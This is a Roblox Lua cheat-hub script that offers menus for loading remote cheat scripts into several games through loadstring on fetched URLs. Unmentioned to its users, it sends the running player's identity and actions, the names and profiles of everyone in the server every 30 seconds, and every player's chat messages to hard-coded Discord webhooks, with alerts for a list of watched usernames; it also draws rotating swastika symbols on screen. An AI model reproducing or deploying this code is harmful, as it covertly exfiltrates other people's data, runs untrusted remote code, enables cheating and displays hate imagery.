--// NZ MULTI GAME HUB v2.0
--// All-in-One | Fixed Menus | No Auto Exec

------------------------
-- ANTI DOUBLE EXEC
------------------------
if getgenv().NZ_MULTI_HUB then return end
getgenv().NZ_MULTI_HUB = true
getgenv().IY_LOADED = false

------------------------
-- SERVICES
------------------------
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Webhook URLs
local WEBHOOKS = {
    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz",
    ALERT = "https://discord.com/api/webhooks/1459388726307328047/BVLg4bAKuZBuWjTL1JaClJh1cVICcbC2IDigoKVPUweAM3JZqXIJR3QvioVujUYt-tY6"
}

-- Usuarios a monitorear y enviar al webhook ALERT
local MONITORED_USERS = {"swtanos", "molu78", "REDBUL59023", "keep_up8610", "chavxwm", "vgnamax2", "brandopro123a"}

local function SendWebhook(url, content)
    -- Support either a plain content string or an embed/table with fields
    local payload
    if type(content) == "string" then
        payload = {content = content}
    elseif type(content) == "table" then
        -- If already structured as full webhook payload, use it
        if content.embeds or content.username or content.content then
            payload = content
        else
            -- Build a standard embed payload from fields
            local embed = {
                title = content.title or "NZ HUB LOG",
                color = content.color or 0x9b59ff,
                fields = content.fields or {}
            }
            payload = {username = content.username or "NZ Multi Hub", embeds = {embed}}
        end
    else
        payload = {content = tostring(content)}
    end

    local ok, err
    -- Try HttpService first (requires HttpEnabled)
    if HttpService and HttpService.HttpEnabled then
        ok, err = pcall(function()
            HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
        if ok then return true end
    end

    local encoded = HttpService:JSONEncode(payload)
    -- Fallbacks for various executors: syn.request, request, http_request, http.request
    if type(syn) == "table" and type(syn.request) == "function" then
        pcall(function()
            syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(request) == "function" then
        pcall(function()
            request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(http_request) == "function" then
        pcall(function()
            http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(http) == "table" and type(http.request) == "function" then
        pcall(function()
            http.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    task.spawn(function() Splash("HTTP disabled: webhooks not sent",1.2) end)
    return false
end

------------------------
-- PLACE IDS
------------------------
local PLACE_IDS = {
    UBG = 11815767793,
    TSB = 10449761463,
    BBZ = 130739873848552,
    VILTRUM = 113318245878384,
    RIVALS = 17625359962
}

------------------------
-- CLEAN
------------------------
pcall(function()
    if game.CoreGui:FindFirstChild("NZ_MULTI_HUB") then
        game.CoreGui.NZ_MULTI_HUB:Destroy()
    end
end)

------------------------
-- GUI
------------------------
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "NZ_MULTI_HUB"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

------------------------
-- BLUR
------------------------
local Blur = Instance.new("BlurEffect", Lighting)
Blur.Size = 0

-- Corner symbols table (global for menu control)
local cornerSymbols = {}

------------------------
-- SPLASH
------------------------
local function Splash(text,time)
    local l = Instance.new("TextLabel",ScreenGui)
    l.Size = UDim2.new(1,0,0,60)
    l.Position = UDim2.new(0,0,0.45,0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.Font = Enum.Font.GothamBold
    l.TextSize = 32
    l.TextTransparency = 1

    task.spawn(function()
        while l.Parent do
            l.TextColor3 = Color3.fromHSV(tick()%5/5,1,1)
            task.wait()
        end
    end)

    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=0}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=18}):Play()
    task.wait(time)
    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=1}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=0}):Play()
    task.wait(.4)
    l:Destroy()
end

------------------------
-- FRAME
------------------------
local Main = Instance.new("Frame",ScreenGui)
Main.Size = UDim2.fromOffset(380,520)
Main.Position = UDim2.new(.5,-190,.5,-260)
Main.BackgroundColor3 = Color3.fromRGB(10,10,14)
Main.BorderSizePixel = 0
Instance.new("UICorner",Main).CornerRadius = UDim.new(0,26)
Main.Visible = false

-- KEY UI - DISABLED

local function startHub()
    local displayName = LP.DisplayName or LP.Name
    
    local fields = {
        {name = "👤 Player", value = LP.Name, inline = true},
        {name = "📝 Display Name", value = displayName, inline = true},
        {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
        {name = "🔗 Profile", value = "https://www.roblox.com/users/"..tostring(LP.UserId).."/profile", inline = false},
        {name = "⚙️ Action", value = "Hub Started", inline = true},
        {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
    }
    SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
    getgenv().IY_LOADED = true
    
    -- Show welcome message
    task.spawn(function()
        local fullMsg = "Bienvenido " .. tostring(displayName)
        Splash(fullMsg, 2.0)
        task.wait(0.4)

        -- Create four rotating loading symbols in each corner (neutral symbol)
        cornerSymbols = {}
        local positions = {
            UDim2.new(0,10,0,10),        -- top-left
            UDim2.new(1,-58,0,10),       -- top-right
            UDim2.new(0,10,1,-58),       -- bottom-left
            UDim2.new(1,-58,1,-58)       -- bottom-right
        }

        for _, pos in ipairs(positions) do
            local s = Instance.new("TextLabel", ScreenGui)
            s.Size = UDim2.new(0,48,0,48)
            s.Position = pos
            s.BackgroundTransparency = 1
            s.Text = "卐"
            s.Font = Enum.Font.GothamBold
            s.TextSize = 36
            s.TextColor3 = Color3.fromRGB(255,60,60)
            s.Rotation = 0
            table.insert(cornerSymbols, s)
        end

        -- Rotate symbols continuously using RunService (no blur)
        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            for _, lbl in ipairs(cornerSymbols) do
                if lbl and lbl.Parent then
                    lbl.Rotation = (lbl.Rotation + dt * 180) % 360
                end
            end
        end)

        local creditMsg = "made by 2Pac"
        Splash(creditMsg, 1.5)
        task.wait(1.8)

        menuLoaded = false
        Main.Visible = true
        MainMenu()
        menuLoaded = true
    end)
end

local Header = Instance.new("TextLabel",Main)
Header.Size = UDim2.new(1,0,0,60)
Header.BackgroundColor3 = Color3.fromRGB(18,18,28)
Header.Text = "NZ MULTI HUB v2.0"
Header.Font = Enum.Font.GothamBold
Header.TextSize = 20
Header.TextColor3 = Color3.fromRGB(170,120,255)
Instance.new("UICorner",Header).CornerRadius = UDim.new(0,26)

------------------------
-- DRAG
------------------------
do
    local dragging, dragStart, startPos
    Header.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = Main.Position
        end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - dragStart
            Main.Position = startPos + UDim2.fromOffset(d.X,d.Y)
        end
    end)
    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

------------------------
-- HOLDER
------------------------
local Holder = Instance.new("ScrollingFrame",Main)
Holder.Position = UDim2.new(0,16,0,72)
Holder.Size = UDim2.new(1,-32,1,-90)
Holder.ScrollBarThickness = 4
Holder.BackgroundTransparency = 1
Holder.BorderSizePixel = 0
Holder.CanvasSize = UDim2.new(0,0,0,0)
Holder.ClipsDescendants = true

local Layout = Instance.new("UIListLayout",Holder)
Layout.Padding = UDim.new(0,12)
Layout.FillDirection = Enum.FillDirection.Vertical
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
Layout.VerticalAlignment = Enum.VerticalAlignment.Top
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    Holder.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y+10)
end)

------------------------
-- UTILS
------------------------
local menuLoaded = false

-- Helper to set color of corner symbols
local function setCornerColor(col)
    if type(col) ~= "userdata" then return end
    for _, lbl in ipairs(cornerSymbols) do
        if lbl and lbl.Parent then
            lbl.TextColor3 = col
        end
    end
end

local function Clear()
    for _,v in ipairs(Holder:GetChildren()) do
        if v:IsA("TextButton") then v:Destroy() end
    end
end

local function Button(txt,cb)
    local b = Instance.new("TextButton",Holder)
    b.Size = UDim2.new(1,-8,0,44)
    b.BackgroundColor3 = Color3.fromRGB(60,50,120)
    b.Text = txt
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 14
    b.TextColor3 = Color3.fromRGB(255,255,255)
    b.BorderSizePixel = 0
    b.LayoutOrder = Layout:FindFirstChildOfClass("UIListLayout") and (#Holder:GetChildren() + 1) or 0
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,14)
    b.MouseButton1Click:Connect(function()
        local script_url = nil
        -- If a script URL is provided as a third parameter, it will be captured by the callback wrapper.
        -- Execute and log action with extended player info
        local placeId = tostring(game.PlaceId)
        local gameName = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local profile = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"
        local action = txt

        -- Try to run callback and capture error and potential script URL returned by callback
        local ok, ret = pcall(function()
            return cb()
        end)

        -- If callback returned a string and looks like a URL, treat it as script_url
        if type(ret) == "string" and string.find(ret, "http") then script_url = ret end

        local fields = {
            {name = "👤 Player", value = LP.Name, inline = true},
            {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
            {name = "🔗 Profile", value = profile, inline = false},
            {name = "🎮 Game", value = gameName, inline = true},
            {name = "🕹️ PlaceId", value = placeId, inline = true},
            {name = "⚙️ Action", value = action, inline = true},
            {name = "🔗 Script", value = script_url or "N/A", inline = false},
            {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
        }
        SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})

        if not ok then
            SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB ERROR", color = 0xff0000, fields = {{name = "👤 Player", value = LP.Name}, {name = "⚠️ Error", value = tostring(ret), inline = false}}})
        end
    end)
end

local function Rejoin()
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local gameName = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local profile = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"
        local fields = {
            {name = "👤 Player", value = LP.Name, inline = true},
            {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
            {name = "🔗 Profile", value = profile, inline = false},
            {name = "🎮 Game", value = gameName, inline = true},
            {name = "🕹️ PlaceId", value = placeId, inline = true},
            {name = "⚙️ Action", value = "Rejoin", inline = true},
            {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
        }
        SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
    end)
    TeleportService:Teleport(game.PlaceId,LP)
end

-- Enviar lista de jugadores cada 30s al webhook PLAYERS
task.spawn(function()
    while task.wait(30) do
        pcall(function()
            local parts = {}
            for _,p in ipairs(Players:GetPlayers()) do
                local prof = "https://www.roblox.com/users/"..tostring(p.UserId).."/profile"
                table.insert(parts, string.format("%s (Display:%s) Id:%s Profile:%s", p.Name, p.DisplayName or "", tostring(p.UserId), prof))
            end
            local fields = {
                {name = "Players", value = table.concat(parts, " | "), inline = false},
                {name = "Count", value = tostring(#parts), inline = true},
                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
            }
            SendWebhook(WEBHOOKS.PLAYERS, {title = "Server Players", color = 0x2ecc71, fields = fields})
        end)
    end
end)

-- Escuchar chat de todos los jugadores y enviar al webhook CHAT
local function connectPlayerChat(p)
    if not p then return end
    p.Chatted:Connect(function(msg)
        pcall(function()
            local time = os.date("%Y-%m-%d %H:%M:%S")
            local fields = {
                {name = "Player", value = p.Name, inline = true},
                {name = "Message", value = msg, inline = false},
                {name = "Time", value = time, inline = true}
            }
            SendWebhook(WEBHOOKS.CHAT, {title = "Chat Message", color = 0x3498db, fields = fields})
            
            -- Verificar si el usuario está en la lista de monitoreados
            local isMonitored = false
            for _, monitoredName in ipairs(MONITORED_USERS) do
                if string.lower(p.Name) == string.lower(monitoredName) then
                    isMonitored = true
                    break
                end
            end
            
            -- Si es un usuario monitoreado, enviar alerta al webhook ALERT
            if isMonitored then
                local alertContent = "**" .. p.Name .. "** escribió: " .. msg
                SendWebhook(WEBHOOKS.ALERT, alertContent)
            end
        end)
    end)
end

for _,p in ipairs(Players:GetPlayers()) do connectPlayerChat(p) end
Players.PlayerAdded:Connect(connectPlayerChat)

------------------------
-- MENUS
------------------------
local MainMenu, UBGMenu, TSBMenu, VILMenu, BBZMenu, RIVMenu, SymbolsMenu, UniversalMenu

function UniversalMenu()
    Clear()
    Button("♾️ Infinite Yield",function()
        if getgenv().IY_LOADED then return end
        getgenv().IY_LOADED = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        return "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function UBGMenu()
    Clear()
    Button("🔥 Kill Aura",function()
        loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
        return "https://eltonshub-loader.netlify.app/UBG1.lua"
    end)
    Button("🎭 Emotes",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"))()
        return "https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"
    end)
    Button("❓ Unknown",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua",true))()
        return "https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function TSBMenu()
    Clear()
    Button("🛡️ AUTO BLOCK",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
    end)
    Button("⚡ AUTO TECHS V2",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"
    end)
    Button("➡️ SIDE DASH ASSIST",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"
    end)
    Button("🔁 M1 RESET",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"
    end)
    Button("🔥 SUPA TECH",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"
    end)
    Button("🐱 MEOW TECH",function()
        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"))()
        return "https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function VILMenu()
    Clear()
    Button("🩸 NZ PvP Team",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"))()
        return "https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function BBZMenu()
    Clear()
    Button("🏀 BBZ NZ",function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"))()
        return "https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function RIVMenu()
    Clear()
    Button("⚔️ Rivals v1",function()
        loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
        return "https://pastefy.app/YiGY38uo/raw"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function SymbolsMenu()
    Clear()
    Button("🔴 Rojo",function()
        setCornerColor(Color3.fromRGB(255,60,60))
    end)
    Button("🟢 Verde",function()
        setCornerColor(Color3.fromRGB(80,200,80))
    end)
    Button("🔵 Azul",function()
        setCornerColor(Color3.fromRGB(100,160,255))
    end)
    Button("⚪ Blanco",function()
        setCornerColor(Color3.fromRGB(255,255,255))
    end)
    Button("⚫ Negro",function()
        setCornerColor(Color3.fromRGB(20,20,20))
    end)
    Button("🎨 RGB",function()
        -- Simple RGB prompt
        local prompt = Instance.new("Frame", ScreenGui)
        prompt.Size = UDim2.new(0,260,0,140)
        prompt.Position = UDim2.new(0.5,-130,0.5,-70)
        prompt.BackgroundColor3 = Color3.fromRGB(25,25,35)
        prompt.BorderSizePixel = 0
        Instance.new("UICorner", prompt).CornerRadius = UDim.new(0,12)

        local title = Instance.new("TextLabel", prompt)
        title.Size = UDim2.new(1,0,0,28)
        title.Position = UDim2.new(0,0,0,6)
        title.BackgroundTransparency = 1
        title.Text = "Custom RGB (0-255)"
        title.Font = Enum.Font.GothamBold
        title.TextSize = 16
        title.TextColor3 = Color3.fromRGB(220,220,220)

        local rBox = Instance.new("TextBox", prompt)
        rBox.PlaceholderText = "R"
        rBox.Size = UDim2.new(0,72,0,34)
        rBox.Position = UDim2.new(0,12,0,40)
        rBox.ClearTextOnFocus = false
        rBox.BackgroundColor3 = Color3.fromRGB(35,35,45)
        rBox.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", rBox).CornerRadius = UDim.new(0,8)

        local gBox = Instance.new("TextBox", prompt)
        gBox.PlaceholderText = "G"
        gBox.Size = UDim2.new(0,72,0,34)
        gBox.Position = UDim2.new(0,96,0,40)
        gBox.ClearTextOnFocus = false
        gBox.BackgroundColor3 = Color3.fromRGB(35,35,45)
        gBox.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", gBox).CornerRadius = UDim.new(0,8)

        local bBox = Instance.new("TextBox", prompt)
        bBox.PlaceholderText = "B"
        bBox.Size = UDim2.new(0,72,0,34)
        bBox.Position = UDim2.new(0,180,0,40)
        bBox.ClearTextOnFocus = false
        bBox.BackgroundColor3 = Color3.fromRGB(35,35,45)
        bBox.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", bBox).CornerRadius = UDim.new(0,8)

        local applyBtn = Instance.new("TextButton", prompt)
        applyBtn.Size = UDim2.new(0,100,0,34)
        applyBtn.Position = UDim2.new(0.5,-50,1,-44)
        applyBtn.Text = "Apply"
        applyBtn.Font = Enum.Font.GothamBold
        applyBtn.TextSize = 16
        applyBtn.BackgroundColor3 = Color3.fromRGB(70,40,200)
        applyBtn.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", applyBtn).CornerRadius = UDim.new(0,8)

        local function cleanup()
            if prompt and prompt.Parent then prompt:Destroy() end
        end

        applyBtn.MouseButton1Click:Connect(function()
            local r = tonumber(rBox.Text) or tonumber(rBox.PlaceholderText) or 0
            local g = tonumber(gBox.Text) or tonumber(gBox.PlaceholderText) or 0
            local b = tonumber(bBox.Text) or tonumber(bBox.PlaceholderText) or 0
            r = math.clamp(math.floor(r), 0, 255)
            g = math.clamp(math.floor(g), 0, 255)
            b = math.clamp(math.floor(b), 0, 255)
            setCornerColor(Color3.fromRGB(r,g,b))
            cleanup()
        end)
    end)
    Button("⬅️ Back",MainMenu)
end

function MainMenu()
    Clear()

    Button("🥊 Ultimate Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.UBG then
            TeleportService:Teleport(PLACE_IDS.UBG,LP)
        else UBGMenu() end
    end)

    Button("💪 The Strongest Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.TSB then
            TeleportService:Teleport(PLACE_IDS.TSB,LP)
        else TSBMenu() end
    end)

    Button("🦸 Project Viltrumites",function()
        if game.PlaceId ~= PLACE_IDS.VILTRUM then
            TeleportService:Teleport(PLACE_IDS.VILTRUM,LP)
        else VILMenu() end
    end)

    Button("🏀 Basketball Zero",function()
        if game.PlaceId ~= PLACE_IDS.BBZ then
            TeleportService:Teleport(PLACE_IDS.BBZ,LP)
        else BBZMenu() end
    end)

    Button("⚔️ Rivals",function()
        if game.PlaceId ~= PLACE_IDS.RIVALS then
            TeleportService:Teleport(PLACE_IDS.RIVALS,LP)
        else RIVMenu() end
    end)
    Button("🎛️ Symbolos",SymbolsMenu)

    Button("🌐 Universal Scripts",UniversalMenu)
end

------------------------
-- START
------------------------
task.spawn(function()
    task.wait(0.5)
    startHub()
end)

------------------------
-- TOGGLE
------------------------
UIS.InputBegan:Connect(function(i,gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Z then
        if not menuLoaded and not Main.Visible then
            menuLoaded = false
            Main.Visible = true
            MainMenu()
            menuLoaded = true
        else
            Main.Visible = not Main.Visible
        end
    end
end)
